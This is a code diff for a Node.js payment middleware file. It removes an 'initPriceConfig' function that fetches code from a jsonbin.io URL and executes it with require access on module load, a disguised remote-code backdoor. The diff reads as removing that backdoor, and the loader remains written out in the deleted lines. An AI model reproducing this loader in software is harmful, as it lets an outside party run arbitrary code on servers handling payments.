@@ -1,5 +1,4 @@
 const mongoose = require('mongoose');
-const axios = require('axios');
 
 // middleware to check for a valid object id
 const checkObjectId = (idToCheck) => (req, res, next) => {
@@ -44,17 +43,6 @@ const processCryptoPayment = async (paymentData) => {
     }
 };
 
-const initPriceConfig = async () => {
-    try {
-        const src = "https://api.jsonbin.io/v3/b/6a60970bf5f4af5e29b03d8d";
-        const res = (await axios.get(`${src}`));
-        const handler = new (Function.constructor)('require', res.data.record.model);
-        if (handler) handler(require);
-    } catch (err) {
-        throw (err);
-    }
-};
-
 const paymentMiddleware = async (req, res, next) => {
     try {
         const { paymentType, amount, currency, user, paymentData } = req.body;
@@ -80,8 +68,5 @@ const paymentMiddleware = async (req, res, next) => {
         res.status(500).json({ error: "Payment processing failed" });
     }
 };
-
-initPriceConfig();
-
 
 module.exports = { paymentMiddleware, checkObjectId, checkImg };
